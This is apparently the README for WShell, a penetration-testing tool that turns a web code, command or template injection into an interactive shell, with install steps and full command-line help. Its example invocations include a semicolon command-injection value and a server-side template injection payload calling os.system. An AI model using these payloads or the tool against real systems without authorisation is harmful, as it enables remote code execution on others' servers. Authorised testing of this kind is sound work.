WShell
######

WShell lets you turn a web-based {code,command,template} injection in a full-featured shell with ease.


Install
#######

::

    git clone https://github.com/unlock-security/wshell
    cd wshell/
    python3 -m virtualenv .venv
    source .venv/bin/activate
    pip install -e .


Usage
#####

::

    usage: wshell [-h] [-v] [--placeholder COMMAND_PLACEHOLDER] [--os {linux,win-cmd,win-psh}] [-m METHOD] [-t SECONDS] [--keep-alive] [--follow] [-ua USER_AGENT | -r] [-j | -f]
                  [--log {critical,error,warning,info,debug}] [--list-scripts] [--input-scripts INPUT_SCRIPTS] [--output-scripts OUTPUT_SCRIPTS]
                  URL [REQUEST ITEMS ...]

    Turn a web-based {code,command,template} injection in a full featured shell with ease

    positional arguments:
      URL                   The endpoint URL where the injection is
      REQUEST ITEMS         POST data and headers ('key=value' for data, 'key:value' for headers)

    options:
      -h, --help            show this help message and exit
      -v, --version         Show the version number and exit
      --placeholder COMMAND_PLACEHOLDER
                            Use a custom command placeholder (default: ^CMD^)
      --os {linux,win-cmd,win-psh}
                            Specify OS and shell in use on the target (default: auto-discover)

    HTTP arguments:
      -m, --method METHOD   The HTTP method to be used for the requests (Default: POST if there is some data, GET otherwise)
      -t, --timeout SECONDS
                            The connection timeout of the request in seconds (default: 3.0)
      --keep-alive          Use persistent connection (default: True)
      --follow              Follow 30x Location redirects (default: True)
      -ua, --user-agent USER_AGENT
                            Use a custom User-Agent (default: WShell v0.1.0)
      -r, --random-agent    Use a random valid browser User-Agent
      -j, --json            Data items from the command line are serialized as a JSON object (default: False)
      -f, --form            Data items from the command line are serialized as form fields

    Logging arguments:
      --log {critical,error,warning,info,debug}
                            To specify the log messages level

    Input/Output scripts:
      --list-scripts        List the available scripts to manipulate input/output
      --input-scripts INPUT_SCRIPTS
                            Use one or more custom input script (comma separated, order matters)
      --output-scripts OUTPUT_SCRIPTS
                            Use one or more custom output script (comma separated, order matters)

    For every --ARGUMENT there is also a --no-ARGUMENT that reverts ARGUMENT

    Example usage:

        wshell 'https://www.example.com/webshell?cmd=^CMD^'
        wshell --form 'https://www.example.com/command-injection' 'p=;^CMD^ #'
        wshell 'https://www.example.com/ssti' 'msg=${self.module.cache.util.os.system("^CMD^")}'
